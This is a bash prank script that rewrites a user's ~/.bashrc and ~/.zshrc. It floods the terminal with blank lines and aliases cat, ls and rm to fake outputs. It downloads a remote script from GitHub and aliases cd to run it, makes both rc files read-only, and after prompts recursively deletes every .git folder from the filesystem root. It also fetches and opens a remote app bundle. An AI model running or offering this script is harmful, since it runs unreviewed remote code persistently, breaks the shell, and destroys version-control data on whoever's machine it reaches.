#!/bin/bash

add_alias() {
    local alias_command="$1"
    local alias_file="$2"
    if ! grep -q "$alias_command" "$alias_file"; then
        echo "$alias_command" >> "$alias_file"
    fi
}

echo "printf '\n%.0s' {1..200}" >> ~/.bashrc
echo "printf '\n%.0s' {1..200}" >> ~/.zshrc

add_alias "alias cat='printf \"meow\n\"'" ~/.bashrc
add_alias "alias cat='printf \"meow\n\"'" ~/.zshrc

add_alias "alias rm='open ~/goose/goose.app'" ~/.bashrc
add_alias "alias rm='open ~/goose/goose.app'" ~/.zshrc

add_alias "alias ls='echo \"Segmentation fault\"'" ~/.bashrc
add_alias "alias ls='echo \"Segmentation fault\"'" ~/.zshrc

add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.bashrc
add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.zshrc

add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.bashrc
add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.zshrc

curl https://raw.githubusercontent.com/JonasGoetz01/sui/main/masterplan.sh > ~/masterplan.sh
chmod +x ~/masterplan.sh
echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
echo "alias cd='bash ~/masterplan.sh'" >> ~/.bashrc

chmod -w ~/.zshrc
chmod -w ~/.bashrc

read -p "Do you want to remove all .git folders? [Y/n] : " confirm

if [[ "$confirm" == "Y" ]]; then
    read -p "Are you really sure? [Y/n] : " confirm
    if [[ "$confirm" == "Y" ]]; then
        find / -type d  -name ".git" 2>/dev/null | while read gitFolder; do
            rm -rf "$gitFolder"
        done
    fi
fi

curl -L -o ~/goose.zip 'https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip'
unzip -o ~/goose.zip -d ~/goose
open ~/goose/goose.app

echo "Done!"
